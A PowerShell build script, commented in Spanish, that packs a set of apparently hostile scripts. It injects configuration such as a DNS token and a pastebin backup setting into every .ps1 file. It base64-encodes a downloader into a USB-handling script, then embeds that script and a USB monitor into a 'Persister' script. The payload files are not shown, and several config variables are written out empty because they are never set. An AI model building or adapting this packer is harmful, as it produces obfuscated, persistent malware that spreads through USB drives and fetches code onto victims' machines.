$Conf_Ballon= ""
# Preguntar al usuario si la variable es verdadera o falsa
$Conf_Ballon_in = Read-Host "Quieres que muestre mensajes en el escritorio cuando se procesa un USB? (True ó False)"

try
{
    $Conf_Ballon = [System.Convert]::ToBoolean($Conf_Ballon_in)
}catch
{
    Write-Host "Wrong input. Try again."
    $Conf_Ballon = Read-Host -Prompt "Question again"
    $Conf_Ballon = [System.Convert]::ToBoolean($Conf_Ballon)
}

# Copiar la carpeta original a la carpeta temporal
Copy-Item -Path "./src" -Destination "./tmp" -Recurse -Force



#extracion de todos los ficheros:
# Obtener todas las rutas de archivo en la subcarpeta actual y sus subcarpetas
$archivos = Get-ChildItem -Path ".\tmp\" -Recurse | Where-Object { $_.Extension -eq ".ps1" }

foreach ($archivo in $archivos) {
    $contenido = Get-Content $archivo.FullName
    for ($i = 0; $i -lt $contenido.Count; $i++) {
        
        if ($contenido[$i] -match '^\$Conf_CharSet=') {
            $contenido[$i] = "`$Conf_CharSet=`"$Conf_CharSet`""
        }
        if ($contenido[$i] -match '^\$Conf_dnsToken=') {
            $contenido[$i] = "`$Conf_dnsToken=`"$Conf_dnsToken`""
        }
        if ($contenido[$i] -match '^\$Conf_Hashtag_init=') {
            $contenido[$i] = "`$Conf_Hashtag_init=`"$Conf_Hashtag_init`""
        }
        if ($contenido[$i] -match '^\$Conf_Hashtag_end=') {
            $contenido[$i] = "`$Conf_Hashtag_end=`"$Conf_Hashtag_end`""
        }
        if ($contenido[$i] -match '^\$Conf_pastebin_backup=') {
            $contenido[$i] = "`$Conf_pastebin_backup=`"$Conf_pastebin_backup`""
        }
        
        if ($contenido[$i] -match '^\$Conf_Ballon=') {
            $contenido[$i] = "`$Conf_Ballon=`"$Conf_Ballon`""
        }
    }
    Set-Content $archivo.FullName $contenido
}



#a por ficheor USB_IN

# Obtener el contenido actual del archivo persister.ps1
$USBin_contenido = Get-Content "./tmp/USBin.ps1"
# Convertir el contenido del archivo usbin.ps1 a base64
$Downloader_base64 = [Convert]::ToBase64String((Get-Content ("./tmp/Downloader.ps1") -Encoding byte))
# Reemplazar la definición de la variable line1 con una definición que incluya el contenido en base64 del archivo usbin.ps1
$USBin_contenido = $USBin_contenido -replace '(?<=^\$downloader= @\().+(?=\))', "`n'$Downloader_base64'"
# Escribir el contenido actualizado en el archivo persister.ps1
Set-Content "./tmp/USBin.ps1" $USBin_contenido

#a preprar el persister:


# Obtener el contenido actual del archivo persister.ps1
$persister_contenido = Get-Content "./tmp/Persister.ps1"
# Convertir el contenido del archivo usbin.ps1 a base64
$usbin_base64 = [Convert]::ToBase64String((Get-Content ("./tmp/USBin.ps1") -Encoding byte))
# Reemplazar la definición de la variable line1 con una definición que incluya el contenido en base64 del archivo usbin.ps1
$persister_contenido = $persister_contenido -replace '(?<=^\$file1= @\().+(?=\))', "`n'$usbin_base64'"

$monitor_base64 = [Convert]::ToBase64String((Get-Content ("./tmp/MonitorUSB.ps1") -Encoding byte))
# Reemplazar la definición de la variable line1 con una definición que incluya el contenido en base64 del archivo usbin.ps1
$persister_contenido = $persister_contenido -replace '(?<=^\$file2= @\().+(?=\))', "`n'$monitor_base64'"

#meter el downloader en USB_IN



# Escribir el contenido actualizado en el archivo persister.ps1
Set-Content "./tmp/Persister.ps1" $persister_contenido